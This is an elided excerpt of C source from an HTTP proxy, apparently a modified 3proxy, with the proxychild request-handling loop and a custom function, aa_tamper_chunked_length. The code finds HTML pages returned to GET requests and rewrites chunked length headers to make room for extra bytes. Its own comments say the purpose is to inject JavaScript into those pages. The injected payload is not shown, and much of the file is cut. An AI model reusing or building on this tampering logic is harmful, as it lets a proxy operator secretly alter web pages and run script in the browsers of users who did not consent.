...
int aa_tamper_chunked_length(struct clientparam* param, unsigned char * buf_p, unsigned char * tamperbuf, const int len)
{
	unsigned int chunked_len = 0;
	
	if (param->tamper != 0 || buf_p == NULL) {
		return -1;
	}
	
	debug_print("tamper_chunked_length() begin \n");

	memcpy(tamperbuf, buf_p, len);

	param->tamper = 1;
	
	tamperbuf[len-2] = '\0';

	sscanf(tamperbuf, "%x", &chunked_len);

	debug_print("orignal chunked len = %d\n", chunked_len);
	
	chunked_len = chunked_len + strlen(KEY_AV);
	sprintf(tamperbuf, "%x\r\n", chunked_len);

	if ( strlen(tamperbuf) != len ) {
		debug_print("chucked length is not equal. %d, %d\n", len, strlen(tamperbuf));
		param->content_type = 2; // error, don't inject js to html
		return -1;
	}

	debug_print("tamper is success. new chunked len = %d!\n", chunked_len);
...
/*printf("Got: %s\n", buf+inbuf);*/
 ...
 debug_print("proxychild, ready call handlehdrfilterscli\n");
 ...
 if(param->ndatfilterscli > 0 && contentlength64 > 0){
  ...
  if(newlen64 == contentlength64) {
  	debug_print("ready call handledatfltcli in proxychild\n");
 ...
 if(ftp && param->redirtype != R_HTTP){
	...
	*sp = 0;
	...
	if(!mode){
		...
		debug_print("ready call scokmap\n");
 ...
 if(isconnect && param->redirtype != R_HTTP) {
	...
	debug_print("ready call scokmap bbbb\n");
 ...
 if(contentlength64 > 0){
	 ...
	 debug_print("ready call scokmap ccccc\n");
 ...
 while( (i = sockgetlinebuf(param, SERVER, buf + inbuf, LINESIZE - 1, '\n', conf.timeouts[(res)?STRING_S:STRING_L])) > 2) {
	...
	else if(i>18 && (!strncasecmp((char *)(buf+inbuf), "transfer-encoding", 17))){
		buf[inbuf+i]=0;
		sb = (unsigned char *)strchr((char *)(buf+inbuf), ':');
		if(!sb)continue;
		++sb;
	...
	else if(i>13 && (!strncasecmp((char *)(buf+inbuf), "content-type", 12))){ // Content-Type
		buf[inbuf+i]=0;
		sb = (unsigned char *)strchr((char *)(buf+inbuf), ':');
		if(!sb)continue;
		++sb;
		while(isspace(*sb))sb++;
		if(!strncasecmp((char *)sb, "text/html", 9)){
			debug_print("the page is html!\n");
			if (param->operation == HTTP_GET) {
				debug_print("it is GET\n");
				param->content_type = 1;
			}
			else {
				debug_print("it is not GET\n");
				param->content_type = 0;
			}
		}
		else {
			debug_print("the page is not html!\n");
			param->content_type = 0;
		}
	}	
	inbuf += i;
...
#ifndef WITHMAIN
debug_print("ready call handlehdrfilterssrv in proxychild. bufsize=%d\n", bufsize);
 ...
 if (conf.filtermaxsize && contentlength64 > (uint64_t)conf.filtermaxsize) {
  ...
  if(newlen == contentlength64) {
	debug_print("handledatfltsrv() call in proxychild()\n");
 ...
 if((param->chunked || contentlength64 > 0) && param->operation != HTTP_HEAD && res != 204 && res != 304) {
	debug_print("Chunked Loop begin ............ %d\n", param->chunked);
	do {
		if(param->chunked){
			unsigned char smallbuf[32] = { 0 };
			unsigned char tamperbuf[32] = { 0 };
			while ((i = sockgetlinebuf(param, SERVER, smallbuf, 30, '\n', conf.timeouts[STRING_S])) == 2) {
				if (socksend(param->clisock, smallbuf, i, conf.timeouts[STRING_S]) != i){
					RETURN(533);
				}
				if(param->chunked == 2) {debug_print("Chunked Loop exit.\n"); break;}
			}
			if(i<3) {
				keepalive = 0;
				break;
			...
			debug_print("chunked length string = %s\n", smallbuf);
			
			if (param->content_type == 1 && param->status == 200) {
				if ( aa_tamper_chunked_length(param, smallbuf, tamperbuf, i ) != -1 ) {
					debug_print("chunked length string = %s\n", tamperbuf);
					if (socksend(param->clisock, tamperbuf, i, conf.timeouts[STRING_S]) != i){
							RETURN(535);
					}
				}
				else {
			...
			if(contentlength64 == 0) {
				param->chunked = 2; // it means the lasted chunked
				debug_print("Chunked Loop will be end ........... %d\n", param->chunked);
			}
		}
		if(param->chunked != 2){
			param->waitserver64 = contentlength64;
			debug_print("sockmap() call in proxychild() Chunked Loop\n");
		 	if((res = sockmap(param, conf.timeouts[CONNECTION_S])) != 98){
				debug_print("sockmap() return != 98\n");
				RETURN(res);
			}
 ...
 if(isconnect && res == 200 && param->operation){
 	debug_print("sockmap() call  in proxychild() res = 200\n");
	...
	ckeepalive = keepalive = 1;
 	...
 	debug_print("sockmap() call in proxychild() chunked = 0\n");
	RETURN(sockmap(param, conf.timeouts[CONNECTION_S]));
 }
 contentlength64 = 0;
REQUESTEND:
 ...
 debug_print("session will be end.\n");
...
CLEANRET:
 ...
 debug_print("proxychild() will exit.\n");
 logurl(param, (char *)buf, (char *)req, ftp);
 if(req)myfree(req);
 if(buf)myfree(buf);
 if(ftpbase)myfree(ftpbase);
